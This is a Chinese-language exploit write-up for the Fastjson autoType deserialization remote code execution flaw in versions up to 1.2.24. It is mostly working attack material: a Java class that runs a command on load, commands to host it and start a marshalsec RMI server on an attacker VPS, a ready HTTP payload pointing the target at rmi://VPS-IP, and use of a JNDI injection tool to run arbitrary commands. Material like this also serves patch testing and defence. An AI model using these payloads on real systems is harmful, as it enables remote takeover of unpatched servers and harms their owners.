## 漏洞概述

Fastjson在1.2.24以及之前版本存在远程代码执行高危安全漏洞

Fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set/get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链

## 影响范围

```http
Fastjson <= 1.2.24
```

## POC

1、编译POC

将代码编写为class类文件，并将生成的类文件放在web目录下，启动web服务

```java
//POC.java
import java.lang.Runtime;
import java.lang.Process;

public class POC {
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"ping", "bnntoh.dnslog.cn"};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
}
```

```bash
#编译
javac POC.java
```

```bash
#启动web服务
python3 -m http.server 8001
```

2、配置RMI环境

用marshalsec项目，启动一个RMI服务器，监听9999端口，并加载远程类

下载地址：https://github.com/mbechler/marshalsec 

切换到marshalsec目录下使用maven进行打包，

```bash
mvn clean package -DskipTests
```

开启监听

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://VPS-IP:8001/#POC" 9999
```

备注：http://xx.xx.xx.xx:9999/#POC 是放Java类的地址，类只要写名字即可，不需要加.class，其次类名前要加#

3、发送Payload

```http
POST / HTTP/1.1
Host: 192.168.2.133:32768
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 167

{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://VPS-IP:9999/POC",
        "autoCommit":true
    }

}
```

## EXP

**使用相对简单的自动化工具**

对于JNDI注入POC，会使用到RmiServer或者LdapServer（在Jndi注入中Ldap比Rmi的条件限制少）

[@welk1n（JNDI-Injection-Exploit）](https://github.com/welk1n/JNDI-Injection-Exploit)

需要VPS放行端口，此工具会自动打开监听端口

1、自动开启RMI和LDAP服务以及发布Exploit类

```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "要执行的命令" -A "VPS-IP"
```

2、Burp发送Payload（即POC中的第三步）